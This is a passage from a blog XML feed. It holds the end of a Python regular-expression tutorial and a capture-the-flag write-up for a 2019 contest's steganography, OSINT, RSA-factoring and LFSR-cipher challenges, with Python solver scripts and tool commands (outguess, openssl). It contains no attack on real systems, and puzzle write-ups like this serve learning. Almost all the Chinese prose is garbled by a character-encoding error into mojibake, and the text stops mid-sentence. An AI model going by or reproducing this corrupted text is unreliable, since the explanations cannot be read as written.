class="attr">data-view</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/5.mp3"</span> <span class="attr">singer</span>=<span class="string">"ç¨‹æ…§ç²"</span>&gt;</span>è®°äº‹æœ¬<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-veiw</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/6.mp3"</span> <span class="attr">singer</span>=<span class="string">"é‚“ä¸½å›"</span>&gt;</span>ä½†æ„¿äººé•¿ä¹…<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line">result = re.findall('<span class="tag">&lt;<span class="name">li.*?href="(.*?)".*?singer="(.*?)"</span>&gt;</span>(.*?)<span class="tag">&lt;/<span class="name">a</span>&gt;</span>', html, re.S)</span><br><span class="line">if result:</span><br><span class="line">    print(result)</span><br><span class="line">    for res in result:</span><br><span class="line">        print(res[0], res[1], res[2])</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">'/2.mp3'</span>, <span class="string">'ä»»è´¤é½'</span>, <span class="string">'æ²§æµ·ä¸€å£°ç¬‘'</span>), (<span class="string">'/3.mp3'</span>, <span class="string">'é½ç§¦'</span>, <span class="string">'å¾€äº‹éšé£'</span>), (<span class="string">'/4.mp3'</span>, <span class="string">'beyond'</span>, <span class="string">'å…‰è¾‰å²æœˆ'</span>), (<span class="string">'/5.mp3'</span>, <span class="string">'ç¨‹æ…§ç²'</span>, <span class="string">'è®°äº‹æœ¬'</span>), (<span class="string">'/6.mp3'</span>, <span class="string">'é‚“ä¸½å›'</span>, <span class="string">'ä½†æ„¿äººé•¿ä¹…'</span>)]</span><br><span class="line">/<span class="number">2</span><span class="selector-class">.mp3</span> ä»»è´¤é½ æ²§æµ·ä¸€å£°ç¬‘</span><br><span class="line">/<span class="number">3</span><span class="selector-class">.mp3</span> é½ç§¦ å¾€äº‹éšé£</span><br><span class="line">/<span class="number">4</span><span class="selector-class">.mp3</span> beyond å…‰è¾‰å²æœˆ</span><br><span class="line">/<span class="number">5</span><span class="selector-class">.mp3</span> ç¨‹æ…§ç² è®°äº‹æœ¬</span><br><span class="line">/<span class="number">6</span><span class="selector-class">.mp3</span> é‚“ä¸½å› ä½†æ„¿äººé•¿ä¹…</span><br></pre></td></tr></table></figure><h4 id="9-sub-æ–¹æ³•-å»é™¤åŒ¹é…çš„å­—ç¬¦"><a href="#9-sub-æ–¹æ³•-å»é™¤åŒ¹é…çš„å­—ç¬¦" class="headerlink" title="9.sub()æ–¹æ³•, å»é™¤åŒ¹é…çš„å­—ç¬¦"></a>9.sub()æ–¹æ³•, å»é™¤åŒ¹é…çš„å­—ç¬¦</h4><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸¤ä¸ªâ€™ï¼Œè¡¨ç¤ºå§â€™\d+â€˜ åŒ¹é…çš„å†…å®¹æ›¿æ¢æˆç©ºï¼Œå¦‚æœå†™sub(â€™\d+â€™, â€˜?â€™), åˆ™æŠŠåŒ¹é…çš„å†…å®¹æ›¿æ¢æˆ ?ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'54abc59de335f7778888g'</span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">''</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br><span class="line">??abc??<span class="keyword">de</span>???f???????<span class="keyword">g</span></span><br><span class="line">?abc?<span class="keyword">de</span>?f?<span class="keyword">g</span></span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹åƒreplaceï¼Œä½†æ˜¯å¤šä¸€ä¸ªæ­£åˆ™å…³ç³»åŒ¹é…</p><h4 id="10-compile"><a href="#10-compile" class="headerlink" title="10.compile()"></a>10.compile()</h4><p>åœ¨éœ€è¦åŒ¹é…ç›¸åŒæ­£åˆ™è¡¨è¾¾å¼æƒ…å†µä¸‹, äº‹å…ˆå®šä¹‰ä¸€ä¸ªcompileå¯ä»¥ç®€åŒ–ä»£ç é‡, åŒæ—¶compileä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ä¿®é¥°ç¬¦re.Sç­‰.</p><p>( å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥a=ruleï¼Œç„¶å result = re.findall(a,string) ,ä½†æ˜¯è¿™æ ·å­å°±ä¸èƒ½ç”¨ä¿®é¥°ç¬¦re.Säº†)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content1 = '2016-1-1 12:01'</span><br><span class="line">content2 = '2017-1-1 12:02'</span><br><span class="line">content3 = '2018-1-1 12:03'</span><br><span class="line"></span><br><span class="line">pattern = re.compile('\d&#123;2&#125;:\d&#123;2&#125;')</span><br><span class="line">result1 = re.sub(pattern, '', content1)</span><br><span class="line">result2 = re.sub(pattern, '', content2)</span><br><span class="line">result3 = re.sub(pattern, '', content3)</span><br><span class="line">print(result1, result2, result3)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2016</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2017</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2018</span><span class="number">-1</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><p>é™„ä¸€æ‰‹å»é™¤åˆ—è¡¨ç©ºå…ƒç´ çš„æ–¹æ³•ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mytest = [<span class="selector-tag">i</span> <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> test <span class="keyword">if</span> <span class="selector-tag">i</span> != <span class="string">''</span>]</span><br></pre></td></tr></table></figure><h3 id="ç•ªå¤–"><a href="#ç•ªå¤–" class="headerlink" title="ç•ªå¤–"></a>ç•ªå¤–</h3><p>è¿™é‡Œè®°ä¸€ä¸‹ä»ä»Li4n0å­¦é•¿è„šæœ¬ä¸­å‘ç°çš„å­—ç¬¦è¡¨æ›¿æ¢å‡½æ•°ï¼š<strong>maketrans()</strong></p><p>è¯­æ³•ï¼šstr.maketrans(intab, outtab)</p><p>å‚æ•°ï¼š</p><p>intab â€“ å­—ç¬¦ä¸²ä¸­è¦æ›¿ä»£çš„å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²</p><p>outtab â€“ ç›¸åº”çš„æ˜ å°„å­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚</p><p>é…åˆstr.translateä½¿ç”¨</p><p>å®ä¾‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intab = <span class="string">"aeiou"</span></span><br><span class="line">outtab = <span class="string">"4310U"</span></span><br><span class="line">transtab = str.maketrans(intab, outtab)</span><br><span class="line"></span><br><span class="line">content = <span class="string">"this is string example....wow!!!"</span></span><br><span class="line">print (content.translate(transtab))</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th1s <span class="number">1</span>s str1ng <span class="number">3</span>x4mpl3....w0w!!!</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://blog.csdn.net/qq_38038143/article/details/80671420" target="_blank" rel="noopener">https://blog.csdn.net/qq_38038143/article/details/80671420</a></p><p><a href="https://www.cnblogs.com/zjltt/p/6955965.html" target="_blank" rel="noopener">https://www.cnblogs.com/zjltt/p/6955965.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 èµ›åšæ¯</title>
      <link href="/2019/07/15/2019%E8%B5%9B%E5%8D%9A%E6%9D%AF/"/>
      <url>/2019/07/15/2019%E8%B5%9B%E5%8D%9A%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://xz.aliyun.com/t/5648" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113451-02002070-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113451-02002070-a456-1.png" alt="img"></a></p><p>æ‰«æ¡å½¢ç å¾—åˆ°flagã€‚</p><h3 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h3><p>snowåŠ å¯†ï¼Œå°†æ–‡ä»¶æ”¾å…¥010editorçœ‹ä»–çš„åå…­è¿›åˆ¶å½¢å¼ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113508-0be31fb6-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113508-0be31fb6-a456-1.png" alt="img"></a></p><p>0D0Aæ˜¯æ¢è¡Œï¼Œå‰©ä¸‹çš„å°†20è½¬0ï¼Œå°†09è½¬1ï¼Œå¾—åˆ°çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å³å¯å¾—åˆ°flagã€‚</p><h3 id="åŸºç¡€ç¤¾å·¥"><a href="#åŸºç¡€ç¤¾å·¥" class="headerlink" title="åŸºç¡€ç¤¾å·¥"></a>åŸºç¡€ç¤¾å·¥</h3><p>é¢˜ç›®ä»‹ç»ï¼šå¤§å®¶éƒ½ç”¨ç€æˆ‘ä»¬çš„æ•°å­—æ­ç”µï¼ˆi.hdu.edu.cn)ä½†æ˜¯å¯¹äºå…¶æ³¨å†Œè€…å´å•¥ä¹Ÿä¸çŸ¥é“ï¼Œæ‰€ä»¥å°yæ‰“ç®—å»çœ‹çœ‹æ³¨å†Œæ•°å­—æ­ç”µçš„åˆ›å§‹äººçš„é‚®ç®±<br>flagå½¢å¼ä¸ºï¼šflag{ä½ æ‰¾åˆ°çš„ç”µå­é‚®ç®±}</p><p>ç™¾åº¦ä¸€ä¸ªIPåæŸ¥è¯¢å·¥å…·ï¼ŒWhoisæŸ¥è¯¢ï¼Œçœ‹çœ‹è¿™ä¸ªIPçš„å¤‡æ¡ˆï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113523-14d1e74c-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113523-14d1e74c-a456-1.png" alt="img"></a></p><p>å¾—åˆ°flagï¼›</p><h3 id="The-world"><a href="#The-world" class="headerlink" title="The world"></a>The world</h3><p>ä¸‹è½½å¾—åˆ°ä¸€å¼ å›¾ï¼ŒçŒœæµ‹æ˜¯éšå†™ï¼Œç›´æ¥foremoståˆ†è§£ï¼Œå¾—åˆ°å››å¼ å›¾ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113536-1c731c6e-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113536-1c731c6e-a456-1.png" alt="img"></a></p><p>ç¬¬ä¸€å¼ æ˜¯å¯è§çš„ï¼Œåº”è¯¥æ²¡ç”¨ï¼Œå‰©ä¸‹æ¥çš„ï¼ŒæŒ‰é¡ºåºçœ‹ã€‚<br>ç¬¬ä¸€ä»½å‹ç¼©åŒ…æ˜¯åŠ å¯†å‹ç¼©åŒ…ï¼Œçœ‹äº†ä¸€ä¸‹ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œäºæ˜¯æ”¾å…¥å·¥å…·è¿›è¡Œç®€å•çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç abc123ï¼Œå¾—åˆ°æ–‡ä»¶ï¼š<br>d2abd3fb9d4c93fb064abf81f5fab84<br>æ–°æ‰‹æ‘é’¥åŒ™<br>ç¬¬äºŒä»½æ–‡ä»¶æ˜¯ä¸€å¼ å›¾ï¼ŒçŒœæµ‹æ˜¯LSBéšå†™ï¼Œå¯†ç ä¸ºä¸Šè¿°å­—ç¬¦ä¸²ï¼Œæµ‹è¯•åå‘ç°ä¸æ˜¯ã€‚ç»§ç»­è€ƒè™‘ï¼Œå¯èƒ½æ˜¯outguessåŠ å¯†ï¼Œ<br>outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84<br>å¾—åˆ°æ–‡ä»¶<br>95cca6c50e48e86c468ee329ddc11047</p><p>æœ€åä¸€å…³å¤§é—¨çš„é’¥åŒ™<br>ç¬¬ä¸‰ä»½æ–‡ä»¶æ˜¯ä¸€ä¸ªmp3æ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯MP3éšå†™ï¼Œç”¨MP3Stegoè§£å¯†ï¼Œå³å¯å¾—åˆ°flag</p><h3 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h3><p>hintï¼šPILæ˜¯ä¸ªå¥½ä¸œè¥¿<br>ä¸‹è½½å¾—åˆ°ä¸¤ä»½ä¸€æ ·çš„æ–‡ä»¶ï¼Œè¯•äº†è¯•ç›²æ°´å°ï¼Œå‘ç°æ²¡æœ‰ç”¨ã€‚ä½¿ç”¨Beyond Compare 4ç»“åˆåå‘ç°<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113558-297f7c0e-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113558-297f7c0e-a456-1.png" alt="img"></a><br>å­—ç¬¦è¿™é‡Œæœ‰ç‚¹ä¸œè¥¿ã€‚æ ¹æ®é¢˜ç›®æç¤ºï¼ŒçŒœæµ‹è¦å°†ä¸¤å¼ å›¾ç‰‡çš„æ‰€æœ‰å…ƒç´ ç‚¹çš„ç°åº¦æ‹¿æ¥ä½œæ¯”è¾ƒï¼Œ<br>æ„é€ è„šæœ¬å¦‚ä¸‹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">"f1.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">"f2.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>=im.<span class="built_in">size</span>[<span class="number">0</span>]  #å›¾ç‰‡å®½</span><br><span class="line"></span><br><span class="line"><span class="built_in">height</span>=im.<span class="built_in">size</span>[<span class="number">1</span>] #å›¾ç‰‡é«˜</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dd=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> x in range(<span class="number">0</span>,<span class="built_in">width</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">for</span> y in range(<span class="number">0</span>,<span class="built_in">height</span>):</span><br><span class="line"></span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line"></span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">if</span>(data!=<span class="number">255</span> <span class="keyword">or</span> data2!=<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">            dd=dd+str(data-data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> i in range (<span class="keyword">int</span>(len(dd)/<span class="number">8</span>)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = dd[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = <span class="keyword">int</span>(<span class="keyword">word</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    flag1 +=chr(<span class="keyword">int</span>(<span class="keyword">word</span>))</span><br><span class="line"></span><br><span class="line">missing_padding = <span class="number">4</span> - len(flag1)%<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">if</span> missing_padding:</span><br><span class="line"></span><br><span class="line">    flag1+= <span class="string">'='</span>*missing_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line"></span><br><span class="line">pic = <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">write</span>(flag)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ‰“ä¸å¼€ï¼Œçœ‹ä»–çš„åå…­è¿›åˆ¶æ•°æ®å‘ç°æ–‡ä»¶å¤´è¢«æ”¹äº†ã€‚æ”¹å›æ¥åå¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113610-30f55f3a-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113610-30f55f3a-a456-1.png" alt="img"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>é¢˜ç›®æ–‡ä»¶æ˜¯public.pem å’Œ flag.encï¼Œå…ˆç”¨opensslæ‰“å¼€.pemæ–‡ä»¶<br>openssl rsa -pubin -text -modulus -in public.pem<br>å¾—åˆ°<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113645-45c7b606-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113645-45c7b606-a456-1.png" alt="img"></a></p><p>å…¶ä¸­ã€‚N=&gt;Modulusï¼Œe=&gt;Exponent<br>æ²¡æœ‰æ›´å¤šä¿¡æ¯ä¸ç®—æ³•äº†ï¼ŒçŒœæµ‹è¿™ä¸ªå¤§æ•°å¯ä»¥ç›´æ¥åˆ†è§£ï¼Œä¸Šyafuã€‚éšåç”¨rsatoolç”Ÿæˆ.pemæ–‡ä»¶ï¼Œå†ç”¨opensslè§£å¯†flag.encï¼Œå¾—åˆ°å­—ç¬¦ä¸²<br>}Y!s04tEP{ygraCl_f<br>æ …æ åŠ æ–¹å‘å³å¯å¾—åˆ°flagï¼Œ<br>rsatoolå’Œopensslçš„ä½¿ç”¨å‚è€ƒ<br><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p><h3 id="å·æµä¸æ¯"><a href="#å·æµä¸æ¯" class="headerlink" title="å·æµä¸æ¯"></a>å·æµä¸æ¯</h3><p>é¢˜ç›®åŠ å¯†è„šæœ¬å’Œå¯†æ–‡<br>åŠ å¯†è„šæœ¬</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> parameters import <span class="keyword">a</span></span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæ ¹æ®flagå‰äº”ä¸ªå­—ç¬¦â€œflag{â€å’Œå¯†æ–‡ï¼Œå¼‚æˆ–å¯ä»¥å¾—åˆ°keyçš„å‰å››åä¸ªå€¼ï¼Œç„¶åçˆ†ç ´å¾—åˆ°a</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">a</span>=[i,j,k,p,q]</span><br><span class="line">                        <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">                        <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">                            <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">                            <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">result</span>==key:</span><br><span class="line">                            print(<span class="keyword">a</span>)</span><br><span class="line">                            break</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">"flag&#123;"</span></span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°a=[1, 0, 0, 1, 0]<br>ç„¶åæ ¹æ®åŠ 